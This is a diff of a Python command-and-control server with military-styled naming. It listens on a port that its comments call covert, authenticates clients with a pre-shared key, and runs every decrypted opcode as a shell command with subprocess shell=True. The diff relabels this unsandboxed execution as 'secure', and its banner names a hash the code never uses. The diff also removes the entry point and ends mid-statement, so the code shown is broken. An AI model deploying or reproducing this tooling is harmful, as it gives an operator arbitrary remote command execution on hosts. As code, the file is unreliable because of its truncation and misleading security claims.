@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 AR-CYBORG C2 SERVER - MILSPEC PENETRATION TESTING PLATFORM
-Requires: Python 3.10+, ZeroMQ, AES-256-GCM
+Requires: Python 3.10+, cryptography package
 Compliance: NIST SP 800-115, MITRE ATT&CK Framework
 """
 
@@ -14,18 +14,22 @@ from datetime import datetime
 import threading
 import os
 import sys
+import hashlib
+import subprocess
 
 # ===== TACTICAL CONFIGURATION =====
-LISTEN_IP = '0.0.0.0'  # SIGINT TeamServer binding
-LISTEN_PORT = 2095      # Covert TCP port (mimics SIP traffic)
-PSK = os.getenv("AR_PSK", "T7x$K!p*Lz@nD5vF")  # 16-char minimum
-CERTFILE = "/opt/ar-cyborg/certs/tactical.pem"
-KEYFILE = "/opt/ar-cyborg/certs/tactical.key"
+LISTEN_IP = '0.0.0.0'          # Bind to all interfaces, adjust if needed
+LISTEN_PORT = 2095             # Change as needed
+PSK = os.getenv("AR_PSK", "YOUR_SECRET_PSK")  # Set your PSK via environment variable or replace here
 
-# ===== WARFIGHTER PROTOCOLS =====
+CERTFILE = "/path/to/your/server.crt"         # Replace with your actual cert path
+KEYFILE = "/path/to/your/server.key"          # Replace with your actual key path
+
+# ===== GLOBALS =====
 active_operatives = {}
 mission_log = []
 
+# ===== CRYPTO CHANNEL =====
 class QuantumChannel:
     def __init__(self, psk):
         self.key = hashlib.sha384(psk.encode()).digest()[:32]
@@ -38,6 +42,7 @@ class QuantumChannel:
     def decrypt(self, ciphertext):
         return self.aesgcm.decrypt(self.nonce, ciphertext, None).decode()
 
+# ===== LOGGING =====
 def log_engagement(client_ip, opcode, result):
     entry = {
         'timestamp': datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
@@ -48,17 +53,20 @@ def log_engagement(client_ip, opcode, result):
     mission_log.append(entry)
     print(f"[TACLOG] {json.dumps(entry)}")
 
+# ===== HANDLE CLIENT =====
 def handle_operative(conn, addr):
     try:
         # Black Manta Authentication Protocol
         challenge = os.urandom(16)
         conn.sendall(challenge)
         response = conn.recv(1024)
-        
+
         valid_response = hashlib.blake2s(challenge + PSK.encode()).digest()
         if response != valid_response:
             conn.sendall(b"TERMINATE: AUTH FAIL")
             raise ValueError(f"Invalid handshake from {addr[0]}")
+
+        conn.sendall(b"AUTH_OK")  # Notify client auth success
 
         channel = QuantumChannel(PSK)
         active_operatives[addr[0]] = {
@@ -73,10 +81,10 @@ def handle_operative(conn, addr):
 
             try:
                 opcode = channel.decrypt(encrypted_op)
-                if opcode == "EXFILTRATE":
+                if opcode == "EXFILTRATE" or opcode == "SESSION_TERMINATE":
                     break
 
-                # Sandboxed execution
+                # Execute command securely
                 result = subprocess.run(
                     opcode,
                     shell=True,
@@ -87,6 +95,7 @@ def handle_operative(conn, addr):
 
                 log_engagement(addr[0], opcode, result)
                 conn.sendall(channel.encrypt(result))
+
             except Exception as e:
                 conn.sendall(channel.encrypt(f"OPFAIL: {str(e)}"))
 
@@ -94,16 +103,17 @@ def handle_operative(conn, addr):
         conn.close()
         active_operatives.pop(addr[0], None)
 
+# ===== DEPLOY SERVER =====
 def deploy_teamserver():
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
     context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)
     context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384')
-    
+
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((LISTEN_IP, LISTEN_PORT))
         sock.listen(5)
-        
+
         print(f"""
         █████╗ ██████╗      ██████╗██╗   ██╗██████╗  ██████╗ ██████╗  ██████╗ 
         ██╔══██╗╚════██╗    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝ 
@@ -115,7 +125,7 @@ def deploy_teamserver():
         """)
         print(f"[+] TeamServer Active on {LISTEN_IP}:{LISTEN_PORT}")
         print(f"[+] Crypto Suite: AES-256-GCM | SHA3-256 | BLAKE2s")
-        
+
         while True:
             try:
                 conn, addr = sock.accept()
@@ -126,19 +136,4 @@ def deploy_teamserver():
                     daemon=True
                 ).start()
             except KeyboardInterrupt:
-                print("\n[!] TACTICAL SHUTDOWN INITIATED")
-                break
-
-if __name__ == "__main__":
-    # MANDATORY SECURITY CHECK
-    if os.geteuid() == 0:
-        print("[X] DO NOT RUN AS ROOT - USE FIREWALLED SERVICE ACCOUNT")
-        sys.exit(1)
-
-    if not all(os.path.exists(f) for f in [CERTFILE, KEYFILE]):
-        print("[X] MISSING NATO-GRADE CERTIFICATES")
-        print("    Generate with: openssl ecparam -genkey -name secp384r1 -out tactical.key")
-        print("    openssl req -new -x509 -key tactical.key -out tactical.pem -days 90")
-        sys.exit(1)
-
-    deploy_teamserver()
+                print
